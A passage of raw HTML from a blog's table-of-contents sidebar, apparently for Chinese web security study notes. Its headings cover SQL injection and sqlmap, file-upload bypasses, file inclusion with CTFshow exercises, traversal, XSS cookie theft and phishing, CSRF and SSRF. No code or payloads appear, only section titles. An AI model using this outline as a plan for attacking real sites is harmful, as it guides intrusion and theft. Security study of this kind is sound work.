href=\"#5-XFF-%E5%A4%B4%E7%BB%95%E8%BF%87-%E7%BB%95%E8%BF%87-ip-%E6%A3%80%E6%B5%8B\"><span class=\"toc-text\">5.XFF 头绕过-绕过 ip 检测</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E7%9B%B2%E6%B3%A8\"><span class=\"toc-text\">三、盲注</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5\"><span class=\"toc-text\">1.增删改查</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD\"><span class=\"toc-text\">2.布尔盲注-逻辑判断</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-%E5%BB%B6%E6%97%B6%E5%88%A4%E6%96%AD\"><span class=\"toc-text\">3.时间盲注- 延时判断</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">4.报错注入-报错回显</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5-%E6%B3%A8%E5%85%A5%E6%9D%A1%E4%BB%B6-%E6%95%B0%E6%8D%AE%E5%9B%9E%E6%98%BE-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86\"><span class=\"toc-text\">5.注入条件-数据回显&amp;错误处理</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81%E8%BF%9B%E9%98%B6%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">四、进阶注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">1.二次注入</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">2.堆叠注入</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%94%E3%80%81SQLMAP-%E7%9A%84%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">五、SQLMAP 的使用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E5%9F%BA%E7%A1%80%E8%AF%AD%E5%8F%A5\"><span class=\"toc-text\">1.基础语句</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E5%88%A4%E6%96%AD%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">2.判断当前数据库的信息</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">3.获取数据库的敏感信息</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96\"><span class=\"toc-text\">4.文件读取</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">5.命令执行</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#6-%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">6.提交方式</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#7-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">7.绕过方法</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#8-%E6%89%A9%E5%B1%95%E5%88%86%E6%9E%90\"><span class=\"toc-text\">8.扩展分析</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#9-%E4%BB%A3%E7%90%86%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">9.代理注入</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#10-%E6%8C%87%E7%BA%B9%E4%BC%AA%E9%80%A0\"><span class=\"toc-text\">10.指纹伪造</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#11-%E6%B7%B1%E5%BA%A6%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">11.深度测试</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-2\"><span class=\"toc-text\">文件上传</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E5%B8%B8%E8%A7%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">一、常规文件上传测试</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81\"><span class=\"toc-text\">1.前端验证</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-htaccess-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">2. htaccess 配置文件</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-MIME-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">3.MIME 绕过</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">4.文件头绕过</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">5.黑名单绕过</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#6-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89\"><span class=\"toc-text\">6.条件竞争</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#7-%E7%B3%BB%E7%BB%9F%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">7.系统特性绕过</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#8-00-%E6%88%AA%E6%96%AD\"><span class=\"toc-text\">8.00 截断</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#9-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93\"><span class=\"toc-text\">9.二次渲染</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#10-%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">10.函数缺陷绕过</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E4%B8%AD%E9%97%B4%E4%BB%B6-%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6%EF%BC%89\"><span class=\"toc-text\">二、漏洞复现（中间件&amp;第三方组件）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-Apache-HTTPD-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89\"><span class=\"toc-text\">1.Apache HTTPD 换行解析漏洞（CVE-2017-15715）</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-Nginx-%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2013-4547%EF%BC%89\"><span class=\"toc-text\">2.Nginx 文件名逻辑漏洞（CVE-2013-4547）</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-Nginx-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">3.Nginx 解析漏洞</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-%E7%BC%96%E8%BE%91%E5%99%A8-%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3-%E7%AC%AC%E4%B8%89%E6%96%B9%E5%A4%84%E7%90%86%E5%BC%95%E7%94%A8\"><span class=\"toc-text\">4.编辑器&amp;上传相关&amp;第三方处理引用</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5-CMS-%E6%BA%90%E7%A0%81-%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3-%E5%B7%B2%E7%9F%A5%E8%AF%86%E5%88%AB%E5%88%B0%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">5.CMS 源码&amp;上传相关&amp;已知识别到利用</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#6-%E9%80%9A%E8%BE%BE-OA-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">6.通达 OA 任意文件上传</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E5%AE%89%E5%85%A8%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">三、安全上传</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E7%9B%AE%E5%BD%95%E6%9D%83%E9%99%90\"><span class=\"toc-text\">1.目录权限</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E5%AD%97%E8%8A%82%E6%B5%81%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE\"><span class=\"toc-text\">2.字节流传输数据</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-%E5%88%86%E7%AB%99%E5%AD%98%E5%82%A8\"><span class=\"toc-text\">3.分站存储</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-OSS-%E4%BA%91%E5%AD%98%E5%82%A8\"><span class=\"toc-text\">4.OSS 云存储</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5-%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">5.总结</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-2\"><span class=\"toc-text\">文件包含</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">一、基础知识</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">二、远程文件包含</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">三、本地文件包含</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81%E4%BC%AA%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">四、伪协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">1.基础知识</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E9%BB%91%E7%9B%92%E5%88%A9%E7%94%A8-vulnweb-%E6%9C%89%E6%97%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">2.黑盒利用-vulnweb-有无文件包含</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-%E7%99%BD%E7%9B%92%E5%88%A9%E7%94%A8-ctfshow-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%8E%A9%E6%B3%95\"><span class=\"toc-text\">3.白盒利用-ctfshow-伪协议玩法</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%94%E3%80%81CTFshow-%E6%BC%94%E7%A4%BA\"><span class=\"toc-text\">五、CTFshow 演示</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-CTFshow-78-http-%E4%BC%AA%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">1.CTFshow-78 http 伪协议</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-CTFshow-79-data-%E4%BC%AA%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">2.CTFshow-79 data 伪协议</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-CTFshow-80%E3%80%8181-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">3.CTFshow-80、81 日志文件利用</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-CTFshow-82-Session-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89\"><span class=\"toc-text\">4.CTFshow-82 Session&amp;条件竞争</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5-CTFshow-87-php-filter-write-%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81\"><span class=\"toc-text\">5.CTFshow-87 php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#6-CTFshow-88\"><span class=\"toc-text\">6.CTFshow-88</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#7-CTFshow-117-php-filter-write-%E6%96%B0%E7%9A%84%E7%AE%97%E6%B3%95\"><span class=\"toc-text\">7.CTFshow-117 php:&#x2F;&#x2F;filter&#x2F;write&amp;新的算法</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-2\"><span class=\"toc-text\">文件下载</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E9%BB%91%E7%99%BD%E7%9B%92\"><span class=\"toc-text\">一、文件安全-下载&amp;删除-黑白盒</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD\"><span class=\"toc-text\">1.任意文件下载</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%E4%B8%80-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD\"><span class=\"toc-text\">演示案例一  文件下载</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%E4%BA%8C-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96\"><span class=\"toc-text\">演示案例二  文件读取</span></a></li></ol></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4\"><span class=\"toc-text\">2.任意文件删除</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B\"><span class=\"toc-text\">演示案例</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81-%E7%9B%AE%E5%BD%95%E5%AE%89%E5%85%A8-%E9%81%8D%E5%8E%86-%E7%A9%BF%E8%B6%8A-%E9%BB%91%E7%99%BD%E7%9B%92\"><span class=\"toc-text\">二、 目录安全-遍历&amp;穿越-黑白盒</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86\"><span class=\"toc-text\">1.目录遍历</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A\"><span class=\"toc-text\">2.目录穿越</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-%E9%BB%91%E7%9B%92%E5%88%86%E6%9E%90\"><span class=\"toc-text\">3.黑盒分析</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-%E7%99%BD%E7%9B%92%E5%88%86%E6%9E%90\"><span class=\"toc-text\">4.白盒分析</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5-%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">5.常见绕过方式</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84\"><span class=\"toc-text\">绝对路径</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%8F%8C%E5%86%99%E2%80%A6-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">双写…&#x2F;绕过</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#URL-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">URL 编码绕过</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E9%85%8D%E5%90%88%E2%80%A6\"><span class=\"toc-text\">绝对路径配合…&#x2F;</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80\"><span class=\"toc-text\">截断文件后缀</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#XSS-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">XSS 跨站脚本攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B\"><span class=\"toc-text\">一、基础类型</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E5%88%86%E7%B1%BB%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">1.分类测试</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS\"><span class=\"toc-text\">2. 反射型 XSS</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS\"><span class=\"toc-text\">3.存储型 XSS</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-DOM-%E5%9E%8B-XSS\"><span class=\"toc-text\">4.DOM 型 XSS</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E6%89%A9%E5%B1%95%E7%B1%BB%E5%9E%8B\"><span class=\"toc-text\">二、扩展类型</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-SVG-XSS\"><span class=\"toc-text\">1.SVG-XSS</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B\"><span class=\"toc-text\">实战案例</span></a></li></ol></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-PDF-XSS\"><span class=\"toc-text\">2.PDF-XSS</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86-2\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B-2\"><span class=\"toc-text\">实战案例</span></a></li></ol></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-Flash-XSS\"><span class=\"toc-text\">3.Flash-XSS</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86-3\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98%E6%BC%94%E7%A4%BA\"><span class=\"toc-text\">实战演示</span></a></li></ol></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-mXSS\"><span class=\"toc-text\">4.mXSS</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5-uXSS\"><span class=\"toc-text\">5.uXSS</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81XSS-%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">三、XSS 平台搭建</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-BlueLotus-XSS\"><span class=\"toc-text\">1.BlueLotus_XSS</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-Beef\"><span class=\"toc-text\">2.Beef</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81XSS-%E7%9B%B2%E6%89%93\"><span class=\"toc-text\">四、XSS 盲打</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%94%E3%80%81Cookie-%E7%9B%97%E5%8F%96\"><span class=\"toc-text\">五、Cookie 盗取</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%A1%88%E4%BE%8B%E4%B8%80%E3%80%81%E5%B0%8F%E7%9A%AE%E9%9D%A2%E6%9D%BF\"><span class=\"toc-text\">案例一、小皮面板</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%A1%88%E4%BE%8B%E4%BA%8C%E3%80%81%E8%B4%B7%E6%AC%BE-APP\"><span class=\"toc-text\">案例二、贷款 APP</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%85%AD%E3%80%81%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8-%E6%95%B0%E6%8D%AE%E6%8F%90%E4%BA%A4\"><span class=\"toc-text\">六、攻击利用-数据提交</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%83%E3%80%81%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8-%E7%BD%91%E9%A1%B5%E9%92%93%E9%B1%BC\"><span class=\"toc-text\">七、攻击利用-网页钓鱼</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%85%AB%E3%80%81CSP-%E4%B8%8E-HttpOnly\"><span class=\"toc-text\">八、CSP 与 HttpOnly</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-CSP\"><span class=\"toc-text\">1.CSP</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-HttpOnly\"><span class=\"toc-text\">2.HttpOnly</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B9%9D%E3%80%81XSS-Filter-%E5%8F%8A%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA\"><span class=\"toc-text\">九、XSS Filter 及靶场演示</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8D%81%E3%80%81%E9%BB%91%E7%9B%92-XSS-%E6%89%8B%E5%B7%A5%E5%88%86%E6%9E%90\"><span class=\"toc-text\">十、黑盒 XSS 手工分析</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0\"><span class=\"toc-text\">CSRF 跨站请求伪造</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-2\"><span class=\"toc-text\">一、基础知识</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E6%97%A0%E6%A3%80%E6%B5%8B%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">二、无检测实战利用</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81Referer-%E5%92%8C-Origin-%E6%A3%80%E6%B5%8B\"><span class=\"toc-text\">三、Referer 和 Origin 检测</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86-4\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B-3\"><span class=\"toc-text\">实战案例</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">绕过方式</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81Token-%E6%A0%A1%E9%AA%8C\"><span class=\"toc-text\">四、Token 校验</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SSRF-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0\"><span class=\"toc-text\">SSRF 服务端请求伪造</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-3\"><span class=\"toc-text\">一、基础知识</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86-5\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#SSRF-%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">SSRF 的利用方式</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#SSRF-%E7%9A%84%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6\"><span class=\"toc-text\">SSRF 的利用条件</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E9%BB%91%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">黑白盒测试</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B\"><span class=\"toc-text\">二、实战案例</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%97%A0%E9%98%B2%E6%8A%A4%E7%9A%84-SSRF\"><span class=\"toc-text\">无防护的 SSRF</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86-6\"><span class=\"toc-text\">原理</span></a></li><li 